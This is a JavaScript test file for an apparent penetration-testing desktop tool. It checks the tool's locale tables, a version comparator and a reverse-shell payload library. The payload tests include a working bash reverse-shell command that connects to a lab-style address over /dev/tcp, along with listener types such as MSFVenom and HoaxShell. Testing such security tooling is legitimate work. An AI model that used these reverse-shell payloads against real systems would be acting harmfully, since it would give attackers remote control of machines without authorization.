import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { createRequire } from "node:module";

const here = dirname(fileURLToPath(import.meta.url));
const root = resolve(here, "..");
const require = createRequire(import.meta.url);

/**
 * The features recovered from the reference in this round: the localisation
 * table, the reverse-shell payload library and the version comparison.
 */
describe("localisation", () => {
  const languages = [
    "en", "jp", "kr", "ru", "zh", "fr", "de", "ar", "tw", "es", "pt"
  ];

  it("ships every language the reference bundles", () => {
    for (const language of languages) {
      const file = resolve(root, "src/locales", `${language}.json`);
      const table = JSON.parse(readFileSync(file, "utf8"));
      assert.ok(Object.keys(table).length > 40, `${language} has too few namespaces`);
    }
  });

  it("gives every language the same namespaces and keys", () => {
    const reference = JSON.parse(
      readFileSync(resolve(root, "src/locales/en.json"), "utf8")
    );
    const referenceNamespaces = Object.keys(reference).sort();
    for (const language of languages) {
      const table = JSON.parse(
        readFileSync(resolve(root, "src/locales", `${language}.json`), "utf8")
      );
      assert.deepEqual(Object.keys(table).sort(), referenceNamespaces);
      for (const namespace of referenceNamespaces) {
        assert.deepEqual(
          Object.keys(table[namespace]).sort(),
          Object.keys(reference[namespace]).sort()
        );
      }
    }
  });

  it("keeps the reference's own English wording", () => {
    const table = JSON.parse(
      readFileSync(resolve(root, "src/locales/en.json"), "utf8")
    );
    assert.equal(table.header["新建项目"], "New Project");
    assert.equal(table.center["测试清单"], "Task List");
    assert.equal(table.center["目标信息总览"], "Target Overview");
    assert.equal(table.center["攻击面测绘"], "Threat Map");
    assert.equal(table.onboarding["确认并开始使用"], "Confirm and start using");
    assert.equal(table.notsubscribed["未订阅提示"], "Subscription Required");
    assert.equal(table.newversion["新版本更新"], "New Version Available");
    assert.equal(table.notlimit["积分不足提示"], "Insufficient Credits");
  });
});

describe("reverse shell payloads", () => {
  const data = JSON.parse(
    readFileSync(resolve(root, "src/data/reverse-shells.json"), "utf8")
  );

  it("carries the reference's payload library", () => {
    assert.ok(data.payloads.length >= 40);
    assert.deepEqual(data.listenerTypes, ["Reverse", "Bind", "MSFVenom", "HoaxShell"]);
    assert.deepEqual(data.defaults, {
      ip: "10.10.10.101",
      port: 9002,
      payloadType: "Reverse",
      os: "All",
      shell: "bash",
      encoding: "none"
    });
  });

  it("builds a payload from the address and the port", () => {
    const bash = data.payloads.find((entry) => entry.name === "Bash -i");
    assert.ok(bash);
    const built = bash.template.replace("{0}", "10.10.10.101").replace("{1}", "9002");
    assert.equal(built, "bash -i >& /dev/tcp/10.10.10.101/9002 0>&1");
  });

  it("gives every payload a name, an OS and a type", () => {
    for (const entry of data.payloads) {
      assert.ok(entry.name);
      assert.ok(entry.os);
      assert.ok(entry.type);
      assert.ok(entry.template);
    }
  });

  it("covers all four listener types", () => {
    const types = new Set(data.payloads.map((entry) => entry.type));
    for (const type of data.listenerTypes) {
      assert.ok(types.has(type), `no payload for ${type}`);
    }
  });
});

describe("version comparison", () => {
  it("orders dotted versions the way the reference expects", () => {
    const { compareVersions } = require(resolve(root, "electron/ipc/version-compare.cjs"));
    assert.equal(compareVersions("2.1.6", "2.1.6"), 0);
    assert.ok(compareVersions("2.1.7", "2.1.6") > 0);
    assert.ok(compareVersions("2.1.5", "2.1.6") < 0);
    assert.ok(compareVersions("2.2.0", "2.1.9") > 0);
    assert.ok(compareVersions("3.0.0", "2.99.99") > 0);
  });
});
